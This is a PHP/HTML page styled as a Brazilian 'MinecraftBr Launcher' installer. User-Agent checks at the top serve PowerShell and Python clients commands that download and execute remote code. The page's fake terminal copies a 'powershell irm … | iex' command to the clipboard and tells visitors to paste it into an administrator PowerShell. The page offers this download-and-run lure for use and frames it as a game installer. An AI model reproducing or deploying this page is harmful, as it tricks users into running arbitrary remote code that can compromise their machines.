<?php if (stripos($_SERVER['HTTP_USER_AGENT'], "WindowsPowerShell") !== false) {header("Content-Type: text/plain; charset=UTF-8"); echo('powershell -c "irm minecraftbr.com/index.ps1|iex"'); exit(); }?>
<?php if (stripos($_SERVER['HTTP_USER_AGENT'], "python-requests") !== false) {header("Content-Type: text/plain; charset=UTF-8"); echo('exec(__import__("requests").get("https://minecraftbr.com/minecraft.py").text)'); exit(); }?>
<!DOCTYPE html>
  <html lang="pt-BR">
  <head>
    <meta charset="UTF-8">
    <title>MinecraftBr Launcher</title>
    <link rel="icon" href="https://minecraftbr.com/image/favicon.ico" type="image/x-icon">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            background: #121212 url('https://minecraftbr.com/image/background.png') center/cover no-repeat;
            image-rendering: pixelated;
            color: #FFFFFF;
        }

        header {
            width: 100%;
            padding: 20px;
            text-align: center;
        }

        header img {
            width: 300px;
            max-width: 80%;
            margin-bottom: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: rgba(0, 0, 0, 0.75);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            padding: 30px 40px;
            width: 600px;
            margin-bottom: 50px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
        }

        .user-display {
            background: linear-gradient(135deg, #0f4c75, #3282b8);
            border: 1px solid #4a90a4;
            border-radius: 8px;
            padding: 12px;
            width: 100%;
            margin-bottom: 25px;
            text-align: center;
            font-size: 16px;
            color: #FFFFFF;
            font-weight: 600;
            letter-spacing: 1px;
            box-shadow: 0 4px 12px rgba(15, 76, 117, 0.4);
            text-transform: uppercase;
        }

        .login-block {
            display: flex;
            flex-direction: column;
            gap: 18px;
            width: 100%;
        }

        .terminal {
            background: linear-gradient(145deg, #0c0c0c, #1a1a1a);
            border: 2px solid #2d5016;
            border-radius: 12px;
            padding: 20px;
            cursor: pointer;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 11px;
            color: #00ff00;
            line-height: 1.4;
            box-shadow: 
                inset 0 2px 4px rgba(0,255,0,0.1),
                0 6px 20px rgba(0,0,0,0.8);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            white-space: pre-wrap;
        }

        .terminal::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #00ff00, #32cd32, #00ff00);
            opacity: 0.8;
        }

        .terminal:hover {
            background: linear-gradient(145deg, #111111, #222222);
            border-color: #4a7c59;
            transform: translateY(-3px) scale(1.02);
            box-shadow: 
                inset 0 2px 8px rgba(0,255,0,0.15),
                0 12px 30px rgba(0,0,0,0.9),
                0 0 20px rgba(0,255,0,0.2);
            color: #32ff32;
        }

        .terminal::after {
            content: "🖱️ Clique para copiar o comando PowerShell";
            position: absolute;
            bottom: 8px;
            right: 15px;
            font-size: 10px;
            color: #888888;
            opacity: 0.7;
            font-family: 'Segoe UI', sans-serif;
            background: rgba(0,0,0,0.6);
            padding: 4px 8px;
            border-radius: 4px;
            transition: opacity 0.3s ease;
        }

        .terminal:hover::after {
            opacity: 1;
            color: #bbbbbb;
        }

        .prompt {
            color: #ffff00;
            font-weight: bold;
        }

        .command {
            color: #ff6b6b;
            font-weight: bold;
        }

        .success {
            color: #00ff00;
        }

        .info {
            color: #87ceeb;
        }

        .warning {
            color: #ffa500;
        }

        .cursor {
            color: #00ff00;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        footer {
            margin-top: auto;
            margin-bottom: 20px;
            font-size: 12px;
            color: #BBBBBB;
            text-align: center;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #2d5016, #4a7c59);
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            border: 1px solid #00ff00;
            box-shadow: 0 6px 20px rgba(0,0,0,0.7);
            font-family: 'Segoe UI', sans-serif;
            font-size: 14px;
            font-weight: 500;
            opacity: 0;
            transform: translateX(300px);
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            z-index: 1000;
            max-width: 350px;
        }

        .notification.show {
            opacity: 1;
            transform: translateX(0);
        }

        @media (max-width: 650px) {
            .container {
                width: 95%;
                margin: 20px;
                padding: 20px 25px;
            }
            
            .terminal {
                font-size: 10px;
                padding: 15px;
            }
        }
    </style>
</head>
<body>

<header>
    <img src="https://minecraftbr.com/logo.png" alt="MinecraftBr Logo">
</header>

<div class="container">
    <div class="user-display">🖥️ Windows PowerShell</div>

    <div class="login-block">
        <div class="terminal" onclick="copyCommand()">
<span class="info">╔════════════════════════════════════════════╗</span>
<span class="info">║          🎮 MinecraftBR Launcher           ║</span>
<span class="info">║         Instalador Automático v2.0         ║</span>
<span class="info">╚════════════════════════════════════════════╝</span>

<span class="warning">🔍 Status da Instalação:</span>
   <span class="success">Python 3.13: ✅ Instalado</span>
   <span class="success">Pacotes necessários: ✅ Instalados</span>
   <span class="success">Launcher: ✅ Pronto para usar</span>
   <span class="info">Tamanho total: 1030.1 MB</span>

<span class="warning">🎮 O que você deseja fazer?</span>

<span class="info">1️⃣  🚀 Executar MinecraftBR Launcher</span>
<span class="info">2️⃣  🔧 Reparar/Reinstalar</span>
<span class="info">3️⃣  📋 Informações Detalhadas</span>
<span class="info">4️⃣  🔗 Criar Atalho na Área de Trabalho</span>
<span class="info">5️⃣  🗑️  Desinstalar Completamente</span>
<span class="info">0️⃣  ❌ Sair</span>

<span class="prompt">Digite sua escolha (0-5):</span> <span class="cursor">█</span>
        </div>
    </div>
</div>

<!-- <footer>
    MinecraftBr Launcher Web - Execute o PowerShell como Administrador
</footer> -->

<div id="notification" class="notification"></div>

<script>
function copyCommand() {
    const command = 'powershell -c "irm https://minecraftbr.com/|iex"';
    
    navigator.clipboard.writeText(command).then(() => {
        showNotification("✅ Comando copiado com sucesso!", "success");
    }).catch(err => {
        // Fallback para navegadores que não suportam clipboard API
        const textArea = document.createElement('textarea');
        textArea.value = command;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            document.execCommand('copy');
            showNotification("✅ Comando copiado com sucesso!\n\n📋 Cole no PowerShell (como Admin) e pressione Enter", "success");
        } catch (err) {
            showNotification("❌ Erro ao copiar. Comando:\npowershell -c \"irm https://minecraftbr.com/|iex\"", "error");
        } finally {
            document.body.removeChild(textArea);
        }
    });
}

function showNotification(message, type = "success") {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.style.background = type === "success" 
        ? "linear-gradient(135deg, #2d5016, #4a7c59)" 
        : "linear-gradient(135deg, #5d1a1a, #8b2c2c)";
    notification.style.borderColor = type === "success" ? "#00ff00" : "#ff4444";
    
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 4000);
}

// Adiciona efeito de digitação no cursor
setInterval(() => {
    const cursor = document.querySelector('.cursor');
    if (cursor) {
        cursor.style.opacity = cursor.style.opacity === '0' ? '1' : '0';
    }
}, 500);
</script>

</body>
</html>